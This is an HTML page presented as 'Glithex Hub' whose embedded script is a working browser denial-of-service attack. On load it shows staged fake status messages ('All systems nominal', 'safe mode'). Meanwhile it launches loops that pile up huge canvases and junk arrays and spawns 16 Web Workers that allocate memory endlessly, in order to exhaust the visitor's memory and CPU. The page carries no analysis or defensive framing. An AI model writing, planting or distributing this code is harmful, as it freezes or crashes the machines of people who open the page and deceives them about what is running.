<!DOCTYPE html>
<html>
<head>
  <title>Glithex Hub</title>
  <style>
    body { margin: 0; padding: 0; overflow: hidden; background: #000; color: #0f0; font-family: monospace; }
    #log { padding: 10px; }
  </style>
</head>
<body>
<div id="log">Initializing...</div>
<script>
let memoryLeak = [];
let canvasCount = 0;
let isOverloading = false;
const log = document.getElementById('log');

function MainCanvas() {
    if (!isOverloading) return;
    for (let i = 0; i < 5; i++) {
        const canvas = document.createElement('canvas');
        canvas.width = 8000;
        canvas.height = 8000;
        const ctx = canvas.getContext('2d');
        for (let j = 0; j < 100; j++) {
            ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
            ctx.fillRect(Math.random()*8000, Math.random()*8000, 500, 500);
        }
        document.body.appendChild(canvas);
        memoryLeak.push(canvas);
        canvasCount++;
    }
    setTimeout(MainCanvas, 50);
}

function CPULoad() {
    if (!isOverloading) return;
    let junk = [];
    for (let i = 0; i < 5000; i++) {
        let arr = new Array(10000).fill(Math.random());
        junk.push(arr);
    }
    memoryLeak.push(junk);
    setTimeout(CPULoad, 100);
}

function launchWorkers(num) {
    const code = `
        let junk = [];
        while (true) {
            let a = [];
            for (let i = 0; i < 500; i++) {
                a.push(new Array(10000).fill(Math.random()));
            }
            junk.push(a);
        }
    `;
    const blob = new Blob([code], { type: "application/javascript" });
    const url = URL.createObjectURL(blob);
    for (let i = 0; i < num; i++) {
        new Worker(url);
    }
}

function stealthStart() {
    log.innerText = "Loading assets...";
    setTimeout(() => {
        log.innerText = "Preparing environment...";
        setTimeout(() => {
            log.innerText = "Running initial checks...";
            setTimeout(() => {
                log.innerText = "All systems nominal.";
                setTimeout(() => {
                    log.innerText = "Launching Glithex Hub in safe mode.";
                    isOverloading = true;
                    MainCanvas();
                    CPULoad();
                    launchWorkers(16);
                    setInterval(() => {
                        log.innerText = `Glithex Hub running... [${canvasCount} canvases loaded]`;
                    }, 500);
                }, 2000);
            }, 2000);
        }, 2000);
    }, 2000);
}

stealthStart();
</script>
</body>
</html>
